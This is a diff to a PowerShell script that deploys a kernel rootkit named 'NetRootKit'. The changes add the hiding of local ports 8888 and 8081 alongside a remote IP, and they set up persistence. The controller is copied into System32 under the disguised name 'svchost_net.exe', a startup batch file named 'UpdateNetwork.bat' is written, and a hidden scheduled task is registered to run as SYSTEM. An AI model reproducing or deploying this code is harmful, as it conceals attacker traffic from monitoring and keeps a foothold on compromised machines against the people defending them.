@@ -112,7 +112,7 @@ sc.exe start NetRootKit | Out-Null
 Start-Sleep -Seconds 2
 
 # --- 7. Interact with Kernel Driver & Setup Persistence ---
-Write-Host "[*] Sending hide-remote-ip command to NetRootKitController..."
+Write-Host "[*] Sending hide commands to NetRootKitController..."
 if (-not (Test-Path "NetRootKitController.exe")) {
     Write-Host "[-] NetRootKitController.exe not found! Exiting."
     exit
@@ -120,15 +120,22 @@ if (-not (Test-Path "NetRootKitController.exe")) {
 
 # The IP the user requested to hide any traffic for
 $TargetIP = "10.2.0.144"
+$PortsToHide = @("8888", "8081")
 
 Write-Host "[*] Checking connection to driver..."
 .\NetRootKitController.exe check-connection "Ping"
 
 Write-Host "[*] Hiding traffic for IP: $TargetIP"
-$hideOut = .\NetRootKitController.exe hide-remote-ip $TargetIP
-Write-Host $hideOut
+$hideOut1 = .\NetRootKitController.exe hide-remote-ip $TargetIP
+Write-Host $hideOut1
 
-Write-Host "[*] Creating Scheduled Task to persist IP hiding across reboots..."
+foreach ($Port in $PortsToHide) {
+    Write-Host "[*] Hiding local port: $Port"
+    $hideOut2 = .\NetRootKitController.exe hide-ip $Port
+    Write-Host $hideOut2
+}
+
+Write-Host "[*] Creating Scheduled Task to persist IP and Port hiding across reboots..."
 # Copy the controller somewhere safe where it won't be deleted so the scheduled task can find it
 $PersistDir = "C:\Windows\System32\Tasks\NRK"
 if (-not (Test-Path $PersistDir)) {
@@ -137,8 +144,20 @@ if (-not (Test-Path $PersistDir)) {
 }
 Copy-Item ".\NetRootKitController.exe" -Destination "$PersistDir\svchost_net.exe" -Force
 
-# Create a scheduled task that runs as SYSTEM on startup to re-apply the IP hiding
-$Action = New-ScheduledTaskAction -Execute "$PersistDir\svchost_net.exe" -Argument "hide-remote-ip $TargetIP"
+# Create a batch file to run multiple controller commands sequentially on startup
+$BatPath = "$PersistDir\UpdateNetwork.bat"
+$BatContent = @"
+@echo off
+timeout /t 5 /nobreak >nul
+cd /d "%~dp0"
+svchost_net.exe hide-remote-ip $TargetIP
+svchost_net.exe hide-ip 8888
+svchost_net.exe hide-ip 8081
+"@
+Set-Content -Path $BatPath -Value $BatContent
+
+# Create a scheduled task that runs as SYSTEM on startup to re-apply the IP/Port hiding batch file
+$Action = New-ScheduledTaskAction -Execute "$BatPath"
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
